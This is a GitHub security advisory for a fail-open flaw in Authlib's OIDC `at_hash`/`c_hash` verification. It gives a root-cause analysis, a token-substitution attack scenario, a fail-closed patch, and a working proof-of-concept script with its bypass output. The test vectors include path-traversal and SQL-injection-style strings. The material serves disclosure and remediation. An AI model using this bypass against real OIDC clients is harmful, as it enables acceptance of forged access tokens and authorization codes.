# [H] Authlib: Fail-Open Cryptographic Verification in OIDC Hash Binding

## Summary
Severity: High
Advisory: GHSA-m344-f55w-2m6j
CVE: CVE-2026-28498
CWE: CWE-354, CWE-573
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-m344-f55w-2m6j
Type: github-advisory

## Affected
- PyPI: `authlib` — affected >=0 <1.6.9

## Details
## 1. Executive Summary

A critical library-level vulnerability was identified in the **Authlib** Python library concerning the validation of OpenID Connect (OIDC) ID Tokens. Specifically, the internal hash verification logic (`_verify_hash`) responsible for validating the `at_hash` (Access Token Hash) and `c_hash` (Authorization Code Hash) claims exhibits a **fail-open** behavior when encountering an unsupported or unknown cryptographic algorithm. 

This flaw allows an attacker to bypass mandatory integrity protections by supplying a forged ID Token with a deliberately unrecognized `alg` header parameter. The library intercepts the unsupported state and silently returns `True` (validation passed), inherently violating fundamental cryptographic design principles and direct OIDC specifications.

---

## 2. Technical Details & Root Cause

The vulnerability resides within the `_verify_hash(signature, s, alg)` function in `authlib/oidc/core/claims.py`:

```python
def _verify_hash(signature, s, alg):
    hash_value = create_half_hash(s, alg)
    if not hash_value:        # ← VULNERABILITY: create_half_hash returns None for unknown algorithms
        return True            # ← BYPASS: The verification silently passes
    return hmac.compare_digest(hash_value, to_bytes(signature))
```

When an unsupported algorithm string (e.g., `"XX999"`) is processed by the helper function `create_half_hash` in `authlib/oidc/core/util.py`, the internal `getattr(hashlib, hash_type, None)` call fails, and the function correctly returns `None`. 

However, instead of triggering a `Fail-Closed` cryptographic state (raising an exception or returning `False`), the `_verify_hash` function misinterprets the `None` return value and explicitly returns `True`. 

Because developers rely on the standard `.validate()` method provided by Authlib's `IDToken` class—which internally calls this flawed function—there is **no mechanism for the implementing developer to prevent this bypass**. It is a strict library-level liability.

---

## 3. Attack Scenario

This vulnerability exposes applications utilizing Hybrid or Implicit OIDC flows to **Token Substitution Attacks**.

1. An attacker initiates an OIDC flow and receives a legitimately signed ID Token, but wishes to substitute the bound Access Token (`access_token`) or Authorization Code (`code`) with a malicious or mismatched one.
2. The attacker re-crafts the JWT header of the ID Token, setting the `alg` parameter to an arbitrary, unsupported value (e.g., `{"alg": "CUSTOM_ALG"}`).
3. The server uses Authlib to validate the incoming token. The JWT signature validation might pass (or be previously cached/bypassed depending on state), progressing to the claims validation phase.
4. Authlib attempts to validate the `at_hash` or `c_hash` claims. 
5. Because `"CUSTOM_ALG"` is unsupported by `hashlib`, `create_half_hash` returns `None`.
6. Authlib's `_verify_hash` receives `None` and silently returns `True`.
7. **Result:** The application accepts the substituted/malicious Access Token or Authorization Code without any cryptographic verification of the binding hash.

---

## 4. Specification & Standards Violations

This explicit fail-open behavior violates multiple foundational RFCs and Core Specifications. A secure cryptographic library **MUST** fail and reject material when encountering unsupported cryptographic parameters.

**OpenID Connect Core 1.0**
* **§ 3.2.2.9 (Access Token Validation):** "If the ID Token contains an `at_hash` Claim, the Client MUST verify that the hash value of the Access Token matches the value of the `at_hash` Claim." Silencing the validation check natively contradicts this absolute requirement.
* **§ 3.3.2.11 (Authorization Code Validation):** Identically mandates the verification of the `c_hash` Claim.

**IETF JSON Web Token (JWT) Best Current Practices (BCP)**
* **RFC 8725 § 3.1.1:** "Libraries MUST NOT trust the signature without verifying it according to the algorithm... if validation fails, the token MUST be rejected." Authlib's implementation effectively "trusts" the hash when it cannot verify the algorithm.

**IETF JSON Web Signature (JWS)**
* **RFC 7515 § 5.2 (JWS Validation):** Cryptographic validations must reject the payload if the specified parameters are unsupported. By returning `True` for an `UnsupportedAlgorithm` state, Authlib violates robust application security logic.

---

## 5. Remediation Recommendation

The `_verify_hash` function must be patched to enforce a `Fail-Closed` posture. If an algorithm is unsupported and cannot produce a hash for comparison, the validation **must** fail immediately.

**Suggested Patch (`authlib/oidc/core/claims.py`):**

```python
def _verify_hash(signature, s, alg):
    hash_value = create_half_hash(s, alg)
    if hash_value is None:
        # FAIL-CLOSED: The algorithm is unsupported, reject the token.
        return False
    return hmac.compare_digest(hash_value, to_bytes(signature))
```

---

## 6. Proof of Concept (PoC)

The following standalone script mathematically demonstrates the vulnerability across the Root Cause, Implicit Flow (`at_hash`), Hybrid Flow (`c_hash`), and the entire attack surface. It utilizes Authlib's own validation logic to prove the Fail-Open behavior.```bash

```bash
python3 -m venv venv
source venv/bin/activate
pip install authlib cryptography
python3 -c "import authlib; print(authlib.__version__)"
# → 1.6.8
```

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
@title          OIDC at_hash / c_hash Verification Bypass
@affected       authlib <= 1.6.8
@file           authlib/oidc/core/claims.py :: _verify_hash()
@notice         _verify_hash() retorna True cuando create_half_hash() retorna
                None (alg no soportado), causando Fail-Open en la verificacion
                de binding entre ID Token y Access Token / Authorization Code.
@dev            Reproduce el bypass directamente contra el codigo de authlib
                sin mocks. Todas las llamadas son al modulo real instalado.
"""

import hmac
import hashlib
import base64
import time

import authlib
from authlib.common.encoding   import to_bytes
from authlib.oidc.core.util    import create_half_hash
from authlib.oidc.core.claims  import IDToken, HybridIDToken
from authlib.oidc.core.claims  import _verify_hash as authlib_verify_hash

# ─── helpers ──────────────────────────────────────────────────────────────────

R   = "\033[0m"
RED = "\033[91m"
GRN = "\033[92m"
YLW = "\033[93m"
CYN = "\033[96m"
BLD = "\033[1m"
DIM = "\033[2m"

def header(title):
    print(f"\n{CYN}{'─' * 64}{R}")
    print(f"{BLD}{title}{R}")
    print(f"{CYN}{'─' * 64}{R}")

def ok(msg):   print(f"  {GRN}[OK]      {R}{msg}")
def fail(msg): print(f"  {RED}[BYPASS]  {R}{BLD}{msg}{R}")
def info(msg): print(f"  {DIM}          {msg}{R}")

def at_hash_correct(token: str, alg: str) -> str:
    """
    @notice  Computa at_hash segun OIDC Core 1.0 s3.2.2.9.
    @param   token  Access token ASCII
    @param   alg    Algoritmo del header del ID Token
    @return  str    at_hash en Base64url sin padding
    """
    fn = {"256": hashlib.sha256, "384": hashlib.sha384, "512": hashlib.sha512}
    digest = fn.get(alg[-3:], hashlib.sha256)(token.encode()).digest()
    return base64.urlsafe_b64encode(digest[:len(digest)//2]).rstrip(b"=").decode()


def _verify_hash_patched(signature: str, s: str, alg: str) -> bool:
    """
    @notice  Version corregida de _verify_hash() con semantica Fail-Closed.
    @dev     Fix: `if not hash_value` -> `if hash_value is None`
             None es falsy en Python, pero b"" no lo es. El chequeo original
             no distingue entre "algoritmo no soportado" y "hash vacio".
    """
    hash_value = create_half_hash(s, alg)
    if hash_value is None:
        return False
    return hmac.compare_digest(hash_value, to_bytes(signature))

# ─── test 1: root cause ───────────────────────────────────────────────────────

def test_root_cause():
    """
    @notice  Demuestra que create_half_hash() retorna None para alg desconocido
             y que _verify_hash() interpreta ese None como verificacion exitosa.
    """
    header("TEST 1 - Root Cause: create_half_hash() + _verify_hash()")

    token    = "real_access_token_from_AS"
    fake_sig = "AAAAAAAAAAAAAAAAAAAAAA"
    alg      = "CUSTOM_ALG"

    half_hash = create_half_hash(token, alg)
    info(f"create_half_hash(token, {alg!r})  ->  {half_hash!r}  (None = alg no soportado)")

    result_vuln    = authlib_verify_hash(fake_sig, token, alg)
    result_patched = _verify_hash_patched(fake_sig, token, alg)

    print()
    if result_vuln:
        fail(f"authlib _verify_hash() retorno True con firma falsa y alg={alg!r}")
    else:
        ok(f"authlib _verify_hash() retorno False")

    if not result_patched:
        ok(f"_verify_hash_patched() retorno False (fail-closed correcto)")
    else:
        fail(f"_verify_hash_patched() retorno True")

# ─── test 2: IDToken.validate_at_hash() bypass ────────────────────────────────

def test_at_hash_bypass():
    """
    @notice  Demuestra el bypass end-to-end en IDToken.validate_at_hash().
             El atacante modifica el header alg del JWT a un valor no soportado.
             validate_at_hash() no levanta excepcion -> token aceptado.

    @dev     Flujo real de authlib:
               validate_at_hash() -> _verify_hash(at_hash, access_token, alg)
               -> create_half_hash(access_token, "CUSTOM_ALG") -> None
               -> `if not None` -> True -> no InvalidClaimError -> BYPASS
    """
    header("TEST 2 - IDToken.validate_at_hash() Bypass (Implicit / Hybrid Flow)")

    real_token  = "ya29.LEGITIMATE_token_from_real_AS"
    evil_token  = "ya29.MALICIOUS_token_under_attacker_control"
    fake_at_hash = "FAAAAAAAAAAAAAAAAAAAA"

    # --- caso A: token legitimo con alg correcto ---
    correct_hash = at_hash_correct(real_token, "RS256")
    token_legit  = IDToken(
        {"iss": "https://idp.example.com", "sub": "user", "aud": "client",
         "exp": int(time.time()) + 3600, "iat": int(time.time()),
         "at_hash": correct_hash},
        {"access_token": real_token}
    )
    token_legit.header = {"alg": "RS256"}

    try:
        token_legit.validate_at_hash()
        ok(f"Caso A (legitimo, RS256):  at_hash={correct_hash}  ->  aceptado")
    except Exception as e:
        fail(f"Caso A rechazo el token legitimo: {e}")

    # --- caso B: token malicioso con alg forjado ---
    token_forged = IDToken(
        {"iss": "https://idp.example.com", "sub": "user", "aud": "client",
         "exp": int(time.time()) + 3600, "iat": int(time.time()),
         "at_hash": fake_at_hash},
        {"access_token": evil_token}
    )
    token_forged.header = {"alg": "CUSTOM_ALG"}

    try:
        token_forged.validate_at_hash()
        fail(f"Caso B (atacante, alg=CUSTOM_ALG):  at_hash={fake_at_hash}  ->  BYPASS exitoso")
        info(f"access_token del atacante aceptado: {evil_token}")
    except Exception as e:
        ok(f"Caso B rechazado correctamente: {e}")

# ─── test 3: HybridIDToken.validate_c_hash() bypass ──────────────────────────

def test_c_hash_bypass():
    """
    @notice  Mismo bypass pero para c_hash en Hybrid Flow.
             Permite Authorization Code Substitution Attack.
    @dev     OIDC Core 1.0 s3.3.2.11 exige verificacion obligatoria de c_hash.
             Authlib la omite cuando el alg es desconocido.
    """
    header("TEST 3 - HybridIDToken.validate_c_hash() Bypass (Hybrid Flow)")

    real_code  = "SplxlOBeZQQYbYS6WxSbIA"
    evil_code  = "ATTACKER_FORGED_AUTH_CODE"
    fake_chash = "ZZZZZZZZZZZZZZZZZZZZZZ"

    token = HybridIDToken(
        {"iss": "https://idp.example.com", "sub": "user", "aud": "client",
         "exp": int(time.time()) + 3600, "iat": int(time.time()),
         "nonce": "n123", "at_hash": "AAAA", "c_hash": fake_chash},
        {"code": evil_code, "access_token": "sometoken"}
    )
    token.header = {"alg": "XX9999"}

    try:
        token.validate_c_hash()
        fail(f"c_hash={fake_chash!r} aceptado con alg=XX9999 -> Authorization Code Substitution posible")
        info(f"code del atacante aceptado: {evil_code}")
    except Exception as e:
        ok(f"Rechazado correctamente: {e}")

# ─── test 4: superficie de ataque ─────────────────────────────────────────────

def test_attack_surface():
    """
    @notice  Mapea todos los valores de alg que disparan el bypass.
    @dev     create_half_hash hace: getattr(hashlib, f"sha{alg[2:]}", None)
             Cualquier string que no resuelva a un atributo de hashlib -> None -> bypass.
    """
    header("TEST 4 - Superficie de Ataque")

    token    = "test_token"
    fake_sig = "AAAAAAAAAAAAAAAAAAAAAA"

    vectors = [
        "CUSTOM_ALG", "XX9999", "none", "None", "", "RS", "SHA256",
        "HS0", "EdDSA256", "PS999", "RS 256", "../../../etc", "' OR '1'='1",
    ]

    print(f"  {'alg':<22}  {'half_hash':<10}  resultado")
    print(f"  {'-'*22}  {'-'*10}  {'-'*20}")

    for alg in vectors:
        hv     = create_half_hash(token, alg)
        result = authlib_verify_hash(fake_sig, token, alg)
        hv_str = "None" if hv is None else "bytes"
        res_str = f"{RED}BYPASS{R}" if result else f"{GRN}OK{R}"
        print(f"  {alg!r:<22}  {hv_str:<10}  {res_str}")

# ─── main ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print(f"\n{BLD}authlib {authlib.__version__} - OIDC Hash Verification Bypass PoC{R}")
    print(f"authlib/oidc/core/claims.py :: _verify_hash() \n")

    test_root_cause()
    test_at_hash_bypass()
    test_c_hash_bypass()
    test_attack_surface()

    print(f"\n{DIM}Fix: `if not hash_value` -> `if hash_value is None` en _verify_hash(){R}\n")
```

---

## Output

```bash
uthlib 1.6.8 - OIDC Hash Verification Bypass PoC
authlib/oidc/core/claims.py :: _verify_hash() 


────────────────────────────────────────────────────────────────
TEST 1 - Root Cause: create_half_hash() + _verify_hash()
────────────────────────────────────────────────────────────────
            create_half_hash(token, 'CUSTOM_ALG')  ->  None  (None = alg no soportado)

  [BYPASS]  authlib _verify_hash() retorno True con firma falsa y alg='CUSTOM_ALG'
  [OK]      _verify_hash_patched() retorno False (fail-closed correcto)

────────────────────────────────────────────────────────────────
TEST 2 - IDToken.validate_at_hash() Bypass (Implicit / Hybrid Flow)
────────────────────────────────────────────────────────────────
  [OK]      Caso A (legitimo, RS256):  at_hash=gh_beqqliVkRPAXdOz2Gbw  ->  aceptado
  [BYPASS]  Caso B (atacante, alg=CUSTOM_ALG):  at_hash=FAAAAAAAAAAAAAAAAAAAA  ->  BYPASS exitoso
            access_token del atacante aceptado: ya29.MALICIOUS_token_under_attacker_control

────────────────────────────────────────────────────────────────
TEST 3 - HybridIDToken.validate_c_hash() Bypass (Hybrid Flow)
────────────────────────────────────────────────────────────────
  [BYPASS]  c_hash='ZZZZZZZZZZZZZZZZZZZZZZ' aceptado con alg=XX9999 -> Authorization Code Substitution posible
            code del atacante aceptado: ATTACKER_FORGED_AUTH_CODE

────────────────────────────────────────────────────────────────
TEST 4 - Superficie de Ataque
────────────────────────────────────────────────────────────────
  alg                     half_hash   resultado
  ----------------------  ----------  --------------------
  'CUSTOM_ALG'            None        BYPASS
  'XX9999'                None        BYPASS
  'none'                  None        BYPASS
  'None'                  None        BYPASS
  ''                      None        BYPASS
  'RS'                    None        BYPASS
  'SHA256'                None        BYPASS
  'HS0'                   None        BYPASS
  'EdDSA256'              None        BYPASS
  'PS999'                 None        BYPASS
  'RS 256'                None        BYPASS
  '../../../etc'          None        BYPASS
  "' OR '1'='1"           None        BYPASS

Fix: `if not hash_value` -> `if hash_value is None` en _verify_hash()
```

## References
- https://github.com/authlib/authlib/security/advisories/GHSA-m344-f55w-2m6j
- https://nvd.nist.gov/vuln/detail/CVE-2026-28498
- https://github.com/authlib/authlib/commit/b9bb2b25bf8b7e01512d847a95c1749646eaa72b
- https://github.com/authlib/authlib
- https://github.com/authlib/authlib/releases/tag/v1.6.9
